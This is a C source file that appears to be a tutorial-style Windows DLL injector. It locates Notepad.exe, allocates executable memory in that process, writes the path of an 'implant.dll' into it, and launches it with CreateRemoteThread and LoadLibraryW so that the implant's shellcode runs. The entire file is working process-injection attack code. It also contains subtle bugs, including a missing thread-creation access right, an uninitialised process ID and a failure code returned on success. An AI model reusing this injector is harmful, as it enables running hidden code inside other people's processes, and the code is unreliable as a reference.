#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <tlhelp32.h>

#define okay(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[!]" msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", ##__VA_ARGS__)

DWORD findProc(const char* pName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcSnap;
    DWORD pID;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Take SnapShot Of All Running Processes

    if (hProcSnap == NULL) {
        error("Failed Taking Snapshot\tError Code: 0x%ld", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32); // Fill The PROCESSENTRY32 Struct, Needed For Looping Through

    if (!Process32First(hProcSnap, &pe32)) {
        error("Failed Popultaing Structure\tError Code: 0x%ld", GetLastError());
        return 0;
    }

    do {
        if(strcmp(pe32.szExeFile, pName) == 0) { // Lopp Through Each Process and comparing the Name Against Notepad.exe
            pID = pe32.th32ProcessID; // Save the pID if we find it
            break;
        }
    } while(Process32Next(hProcSnap, &pe32));

    CloseHandle(hProcSnap);
    return pID;
}


int main(int argc, char* argv[]) {
    HANDLE hProc        =                NULL; // Holds Handle To Process We Inject Into
    HANDLE hThread      =                NULL; // Holds Handle To Thread We Start
    PVOID rBuffer       =                NULL; // Holds Pointer To Where Our Buffer Is Allocated
    HMODULE hCrow       =                NULL;
    HMODULE Kernal32      =                NULL; // Holds Kernel32.dll location
    DWORD pID           =        0; // Holds Process ID Of Notepad.exe
    DWORD tID           =        0; // Holds Thread ID

    wchar_t dll_path[MAX_PATH] = L"c:\\Users\\.....\\projects\\part2\\implant.dll"; // path Where DLL is Stored
    size_t dll_len =     sizeof(dll_path); // Length Our DLL Path
    size_t bytes_ret =     0;
    const char* pName = "Notepad.exe"; 
    pID = findProc(pName); // Attempt To Find notepad.exe in running Processes
    info("Attempting To Find Notepad.exe");

    if (pID == 0) {
        error("Failed Finding Notepad...");
        return EXIT_FAILURE;
    }

    okay("Found Notepad, pID: %ld\n", pID);

    if ((hProc = OpenProcess((PROCESS_VM_WRITE | PROCESS_VM_OPERATION), FALSE, pID)) == NULL) { // Get Handle To NotePad And Check if we Succeded
        error("Failed To Get Handle To Process %d\tError Code: 0x%ld", pID, GetLastError());
        return EXIT_FAILURE;
    }
    okay("Got Handle To Process\n\\______0x%p\n", hProc);

    info("Attempting To Load Kernal32...");
    Kernal32 = GetModuleHandleW(L"kernel32"); // Load Kernel32.dll

    if (Kernal32 == NULL) {
        error("Failed To Load Kernal32\tError Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Succesfully Loaded Kernel32\n\\______0x%p\n", Kernal32);

    info("Getting Address Of LoadLibraryA...");
    LPTHREAD_START_ROUTINE kLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernal32, "LoadLibraryW"); // Get Address Of LoadLibraryW() From Kernel32.dll
    info("Got Address Of LoadLibraryW\n\\______0x%p\n", kLoadLibrary);

    info("Allocating a Buffer Inside The Process...");
    rBuffer = VirtualAllocEx(hProc, NULL, dll_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // Allocate a Buffer inside the Processes Memory for Our DLL
    if (rBuffer == NULL) {
        error("Failed To Allocate Buffer\tError Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Succesfully Allocated a Buffer");

    info("Attempting To Inject DLL Into Memory...");
    WriteProcessMemory(hProc, rBuffer, dll_path, dll_len, &bytes_ret); // Write The Path To Our DLL inside its memory
    okay("Wrote %d-Bytes Into Processors Memory\n", bytes_ret);

    info("Starting Thread...");
    hThread = CreateRemoteThread(hProc, NULL,  0, kLoadLibrary, rBuffer, 0, &tID); // Start a Thread To Load Our DLL Which Will Then Run Our Shellcode

    if (hThread == NULL) {
        error("Failed to Start Thread\tError Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Thread Started\n\\______0x%p\n", hThread);


    WaitForSingleObject(hThread, INFINITE); // Wait For Exectution To Finish
    info("Thread Finished, Cleaning Up...");

    CloseHandle(hThread);
                            // Close Handles
    CloseHandle(hProc);

    
    return EXIT_FAILURE;

}
